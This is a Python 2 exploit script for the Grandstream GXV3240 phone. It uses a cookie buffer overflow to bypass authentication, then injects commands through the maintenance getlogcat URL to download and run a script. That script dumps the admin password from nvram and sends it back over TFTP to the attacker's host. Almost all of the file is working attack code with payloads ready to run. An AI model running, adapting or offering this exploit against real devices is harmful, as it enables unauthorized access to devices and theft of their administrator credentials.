#!/usr/bin/env python2

# Grandstream GVX3240 password recovery
# Based on the work of Brendan Scarvell.
# https://github.com/scarvell/grandstream_exploits

import sys, urllib2, os, time
from threading import *
import tftpy, signal, socket, optparse


# Define TFTP Server sub
def function_tftpd():
    PID=os.getpid()

    # Write PID to file
    f = open('getpwd.PID', 'w')
    f.write(str(PID))
    f.close()

    # Create tftp server folder
    if not os.path.exists('tftp'):
        os.mkdir('tftp')
    if os.path.exists('tftp/passwd.txt'):
        os.remove('tftp/passwd.txt')
    # Create shell file to exfiltrate password
    f = open('tftp/getpwd.sh','w')
    f.write('nvram show | grep ^2=  | sed s/^2=// > /sdcard/ppp/passwd.txt')
    f.close()

    # Start TFTP Server
    server = tftpy.TftpServer('tftp')
    server.listen('0.0.0.0', 69)


# Cleanup routine
def cleanup():
    print "[+] Cleanup..."

    # Get TFTP process PID
    f = open('getpwd.PID', 'r')
    PID = f.read()
    f.close()

    # Delete files & folder
    if os.path.exists('getpwd.PID'):
        os.remove('getpwd.PID')
    if os.path.exists('tftp/getpwd.sh'):
        os.remove('tftp/getpwd.sh')
    if os.path.exists('tftp/passwd.txt'):
        os.remove('tftp/passwd.txt')
    if os.path.exists('tftp'):
        os.rmdir('tftp')

    print "[*] Finished."
    print "[-] Killing TFTP Server PID..."
    os.kill(int(PID), signal.SIGTERM)
    time.sleep(1)

def main():
    # Parse commandline
    parser = optparse.OptionParser("commandline options:  -t <target host) [-s <Local IP>]")
    parser.add_option('-t', dest='targetHost', type='string', help='Specify the target host IP')
    parser.add_option('-s', dest='localHost', type='string', help='Specify the local host IP')

    (options, args) = parser.parse_args()

    if (options.targetHost == None):
        print parser.usage
        sys.exit()

    # Get local IP address
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    host_ip = (s.getsockname()[0])
    s.close()

    if (options.localHost != None):
        host_ip = options.localHost

    target_host = options.targetHost
    PORT = 80

    if host_ip[:host_ip.rfind(".")] != target_host[:target_host.rfind(".")]:
        print "Local IP & target subnets do not match, auto detect did not work or you need to properly define local IP with -s parameter..."
        sys.exit()

    time.sleep(1)

    # Buffer overflow to bypass auth
    cookie = "phonecookie=\"{}\"".format("A"*93)

    # Start TFTP server as a thread
    t = Thread(target = function_tftpd)
    t.start()

    # Wait 10 secs to allows TFTP server to come up and folders/files to be prepped
    print "[*] Initialising TFTP server..."
    time.sleep(10)

    try:
        payload = "{tftp,-g,-l,/sdcard/ppp/getpwd.sh,-r,getpwd.sh," + host_ip + "}"

        print "[*] TFTP script..."
        pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
        pwn.add_header('Cookie', cookie)
        res = urllib2.urlopen(pwn)
        time.sleep(1)

        payload = "{chmod,+x,/sdcard/ppp/getpwd.sh}"

        print "[*] Make script executable..."
        pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
        pwn.add_header('Cookie', cookie)
        res = urllib2.urlopen(pwn)
        time.sleep(1)

        payload = "{sh,/sdcard/ppp/getpwd.sh}"

        print "[*] Run script..."
        pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
        pwn.add_header('Cookie', cookie)
        res = urllib2.urlopen(pwn)
        time.sleep(1)

        payload = "{tftp,-p,-l,/sdcard/ppp/passwd.txt,-r,passwd.txt," + host_ip + "}"

        print "[*] Get password..."
        pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
        pwn.add_header('Cookie', cookie)
        res = urllib2.urlopen(pwn)
        time.sleep(1)

        f = open('tftp/passwd.txt', 'r')
        file_contents = f.read()
        f.close()

        print "[+] ---Login: admin"
        print "[+] Password: " + file_contents

    except:
        print "[+] Failed to exploit GXV3240!"


    # Run cleanup routine
    time.sleep(1)
    cleanup()

    sys.exit()

# Start script
if __name__ == '__main__':
        main()

